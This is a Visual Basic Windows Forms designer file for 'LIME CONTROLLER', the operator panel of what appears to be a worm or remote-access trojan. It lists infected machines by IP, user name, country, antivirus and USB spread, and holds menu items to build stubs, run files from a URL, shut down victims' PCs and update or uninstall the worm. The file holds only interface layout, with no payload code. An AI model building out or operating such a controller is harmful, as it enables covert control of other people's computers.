<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.ContextMenuStrip1 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.BuilderToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator1 = New System.Windows.Forms.ToolStripSeparator()
        Me.VvvToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromDiskToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromURLToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ComputerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.LogoffToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripMenuItem3 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ShutdownToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.WormSettingToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UpdateToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromDiskToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromURLToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RestartToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.UninstallToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.CloseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator2 = New System.Windows.Forms.ToolStripSeparator()
        Me.AboutToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.NotifyIcon1 = New System.Windows.Forms.NotifyIcon(Me.components)
        Me.ListView1 = New System.Windows.Forms.ListView()
        Me.id = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ip = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.user = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.stub = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.country = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.os = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ver = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.installd = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.spread = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.av = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.hping = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ToolStripStatusLabel1 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.StatusStrip1 = New System.Windows.Forms.StatusStrip()
        Me.ContextMenuStrip1.SuspendLayout()
        Me.StatusStrip1.SuspendLayout()
        Me.SuspendLayout()
        '
        'Timer1
        '
        Me.Timer1.Enabled = True
        '
        'ContextMenuStrip1
        '
        Me.ContextMenuStrip1.BackColor = System.Drawing.SystemColors.Control
        Me.ContextMenuStrip1.ImageScalingSize = New System.Drawing.Size(24, 24)
        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.BuilderToolStripMenuItem, Me.ToolStripSeparator1, Me.VvvToolStripMenuItem, Me.ComputerToolStripMenuItem, Me.WormSettingToolStripMenuItem, Me.ToolStripSeparator2, Me.AboutToolStripMenuItem})
        Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
        Me.ContextMenuStrip1.RenderMode = System.Windows.Forms.ToolStripRenderMode.Professional
        Me.ContextMenuStrip1.ShowImageMargin = False
        Me.ContextMenuStrip1.Size = New System.Drawing.Size(199, 166)
        '
        'BuilderToolStripMenuItem
        '
        Me.BuilderToolStripMenuItem.Name = "BuilderToolStripMenuItem"
        Me.BuilderToolStripMenuItem.Size = New System.Drawing.Size(198, 30)
        Me.BuilderToolStripMenuItem.Text = "Builder"
        '
        'ToolStripSeparator1
        '
        Me.ToolStripSeparator1.Name = "ToolStripSeparator1"
        Me.ToolStripSeparator1.Size = New System.Drawing.Size(195, 6)
        '
        'VvvToolStripMenuItem
        '
        Me.VvvToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.FromDiskToolStripMenuItem1, Me.FromURLToolStripMenuItem1})
        Me.VvvToolStripMenuItem.Image = CType(resources.GetObject("VvvToolStripMenuItem.Image"), System.Drawing.Image)
        Me.VvvToolStripMenuItem.Name = "VvvToolStripMenuItem"
        Me.VvvToolStripMenuItem.Size = New System.Drawing.Size(198, 30)
        Me.VvvToolStripMenuItem.Text = "Run File"
        '
        'FromDiskToolStripMenuItem1
        '
        Me.FromDiskToolStripMenuItem1.Name = "FromDiskToolStripMenuItem1"
        Me.FromDiskToolStripMenuItem1.Size = New System.Drawing.Size(177, 30)
        Me.FromDiskToolStripMenuItem1.Text = "From Disk"
        '
        'FromURLToolStripMenuItem1
        '
        Me.FromURLToolStripMenuItem1.Name = "FromURLToolStripMenuItem1"
        Me.FromURLToolStripMenuItem1.Size = New System.Drawing.Size(177, 30)
        Me.FromURLToolStripMenuItem1.Text = "From URL"
        '
        'ComputerToolStripMenuItem
        '
        Me.ComputerToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.LogoffToolStripMenuItem, Me.ToolStripMenuItem3, Me.ShutdownToolStripMenuItem})
        Me.ComputerToolStripMenuItem.Image = CType(resources.GetObject("ComputerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ComputerToolStripMenuItem.Name = "ComputerToolStripMenuItem"
        Me.ComputerToolStripMenuItem.Size = New System.Drawing.Size(198, 30)
        Me.ComputerToolStripMenuItem.Text = "User PC"
        '
        'LogoffToolStripMenuItem
        '
        Me.LogoffToolStripMenuItem.Name = "LogoffToolStripMenuItem"
        Me.LogoffToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
        Me.LogoffToolStripMenuItem.Text = "Logoff"
        '
        'ToolStripMenuItem3
        '
        Me.ToolStripMenuItem3.Name = "ToolStripMenuItem3"
        Me.ToolStripMenuItem3.Size = New System.Drawing.Size(177, 30)
        Me.ToolStripMenuItem3.Text = "Restart"
        '
        'ShutdownToolStripMenuItem
        '
        Me.ShutdownToolStripMenuItem.Name = "ShutdownToolStripMenuItem"
        Me.ShutdownToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
        Me.ShutdownToolStripMenuItem.Text = "Shutdown"
        '
        'WormSettingToolStripMenuItem
        '
        Me.WormSettingToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.UpdateToolStripMenuItem, Me.RestartToolStripMenuItem1, Me.UninstallToolStripMenuItem1, Me.CloseToolStripMenuItem})
        Me.WormSettingToolStripMenuItem.Image = CType(resources.GetObject("WormSettingToolStripMenuItem.Image"), System.Drawing.Image)
        Me.WormSettingToolStripMenuItem.Name = "WormSettingToolStripMenuItem"
        Me.WormSettingToolStripMenuItem.Size = New System.Drawing.Size(198, 30)
        Me.WormSettingToolStripMenuItem.Text = "Controller Setting"
        '
        'UpdateToolStripMenuItem
        '
        Me.UpdateToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.FromDiskToolStripMenuItem, Me.FromURLToolStripMenuItem})
        Me.UpdateToolStripMenuItem.Name = "UpdateToolStripMenuItem"
        Me.UpdateToolStripMenuItem.ShowShortcutKeys = False
        Me.UpdateToolStripMenuItem.Size = New System.Drawing.Size(178, 30)
        Me.UpdateToolStripMenuItem.Text = "Update"
        '
        'FromDiskToolStripMenuItem
        '
        Me.FromDiskToolStripMenuItem.Name = "FromDiskToolStripMenuItem"
        Me.FromDiskToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
        Me.FromDiskToolStripMenuItem.Text = "From Disk"
        '
        'FromURLToolStripMenuItem
        '
        Me.FromURLToolStripMenuItem.Name = "FromURLToolStripMenuItem"
        Me.FromURLToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
        Me.FromURLToolStripMenuItem.Text = "From URL"
        '
        'RestartToolStripMenuItem1
        '
        Me.RestartToolStripMenuItem1.Name = "RestartToolStripMenuItem1"
        Me.RestartToolStripMenuItem1.Size = New System.Drawing.Size(178, 30)
        Me.RestartToolStripMenuItem1.Text = "Reconnect"
        '
        'UninstallToolStripMenuItem1
        '
        Me.UninstallToolStripMenuItem1.Name = "UninstallToolStripMenuItem1"
        Me.UninstallToolStripMenuItem1.Size = New System.Drawing.Size(178, 30)
        Me.UninstallToolStripMenuItem1.Text = "Uninstall"
        '
        'CloseToolStripMenuItem
        '
        Me.CloseToolStripMenuItem.Name = "CloseToolStripMenuItem"
        Me.CloseToolStripMenuItem.Size = New System.Drawing.Size(178, 30)
        Me.CloseToolStripMenuItem.Text = "Close"
        '
        'ToolStripSeparator2
        '
        Me.ToolStripSeparator2.Name = "ToolStripSeparator2"
        Me.ToolStripSeparator2.Size = New System.Drawing.Size(195, 6)
        '
        'AboutToolStripMenuItem
        '
        Me.AboutToolStripMenuItem.Name = "AboutToolStripMenuItem"
        Me.AboutToolStripMenuItem.Size = New System.Drawing.Size(198, 30)
        Me.AboutToolStripMenuItem.Text = "About"
        '
        'NotifyIcon1
        '
        Me.NotifyIcon1.Text = "NotifyIcon1"
        Me.NotifyIcon1.Visible = True
        '
        'ListView1
        '
        Me.ListView1.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.ListView1.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.ListView1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.id, Me.ip, Me.user, Me.stub, Me.country, Me.os, Me.ver, Me.installd, Me.spread, Me.av, Me.hping})
        Me.ListView1.ContextMenuStrip = Me.ContextMenuStrip1
        Me.ListView1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.ListView1.ForeColor = System.Drawing.Color.Lime
        Me.ListView1.FullRowSelect = True
        Me.ListView1.Location = New System.Drawing.Point(0, 0)
        Me.ListView1.Name = "ListView1"
        Me.ListView1.OwnerDraw = True
        Me.ListView1.Scrollable = False
        Me.ListView1.Size = New System.Drawing.Size(1365, 635)
        Me.ListView1.TabIndex = 5
        Me.ListView1.UseCompatibleStateImageBehavior = False
        Me.ListView1.View = System.Windows.Forms.View.Details
        '
        'id
        '
        Me.id.Text = " ID "
        '
        'ip
        '
        Me.ip.Text = " IP Address "
        '
        'user
        '
        Me.user.Text = " User Name "
        '
        'stub
        '
        Me.stub.Text = " Stub Name "
        '
        'country
        '
        Me.country.Text = " Country "
        '
        'os
        '
        Me.os.Text = " Operating System "
        '
        'ver
        '
        Me.ver.Text = " Version "
        '
        'installd
        '
        Me.installd.Text = " Install Date "
        '
        'spread
        '
        Me.spread.Text = " USB Spread "
        '
        'av
        '
        Me.av.Text = " Anti Virus "
        '
        'hping
        '
        Me.hping.Text = " PING "
        '
        'ToolStripStatusLabel1
        '
        Me.ToolStripStatusLabel1.ForeColor = System.Drawing.SystemColors.ActiveBorder
        Me.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1"
        Me.ToolStripStatusLabel1.Size = New System.Drawing.Size(184, 25)
        Me.ToolStripStatusLabel1.Text = "ToolStripStatusLabel1"
        '
        'StatusStrip1
        '
        Me.StatusStrip1.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.StatusStrip1.ImageScalingSize = New System.Drawing.Size(24, 24)
        Me.StatusStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripStatusLabel1})
        Me.StatusStrip1.Location = New System.Drawing.Point(0, 635)
        Me.StatusStrip1.Name = "StatusStrip1"
        Me.StatusStrip1.Size = New System.Drawing.Size(1365, 30)
        Me.StatusStrip1.SizingGrip = False
        Me.StatusStrip1.TabIndex = 4
        Me.StatusStrip1.Text = "StatusStrip1"
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(9.0!, 20.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.ClientSize = New System.Drawing.Size(1365, 665)
        Me.Controls.Add(Me.ListView1)
        Me.Controls.Add(Me.StatusStrip1)
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.Name = "Form1"
        Me.ShowIcon = False
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "LIME CONTROLLER"
        Me.ContextMenuStrip1.ResumeLayout(False)
        Me.StatusStrip1.ResumeLayout(False)
        Me.StatusStrip1.PerformLayout()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents Timer1 As Timer
    Friend WithEvents ContextMenuStrip1 As ContextMenuStrip
    Friend WithEvents VvvToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents FromDiskToolStripMenuItem1 As ToolStripMenuItem
    Friend WithEvents FromURLToolStripMenuItem1 As ToolStripMenuItem
    Friend WithEvents ComputerToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents LogoffToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ToolStripMenuItem3 As ToolStripMenuItem
    Friend WithEvents ShutdownToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents WormSettingToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents UpdateToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RestartToolStripMenuItem1 As ToolStripMenuItem
    Friend WithEvents UninstallToolStripMenuItem1 As ToolStripMenuItem
    Friend WithEvents CloseToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents BuilderToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ToolStripSeparator1 As ToolStripSeparator
    Friend WithEvents ToolStripSeparator2 As ToolStripSeparator
    Friend WithEvents AboutToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents NotifyIcon1 As NotifyIcon
    Friend WithEvents FromDiskToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents FromURLToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ListView1 As ListView
    Friend WithEvents id As ColumnHeader
    Friend WithEvents stub As ColumnHeader
    Friend WithEvents user As ColumnHeader
    Friend WithEvents country As ColumnHeader
    Friend WithEvents os As ColumnHeader
    Friend WithEvents ver As ColumnHeader
    Friend WithEvents hping As ColumnHeader
    Friend WithEvents installd As ColumnHeader
    Friend WithEvents spread As ColumnHeader
    Friend WithEvents av As ColumnHeader
    Friend WithEvents ip As ColumnHeader
    Friend WithEvents ToolStripStatusLabel1 As ToolStripStatusLabel
    Friend WithEvents StatusStrip1 As StatusStrip
End Class
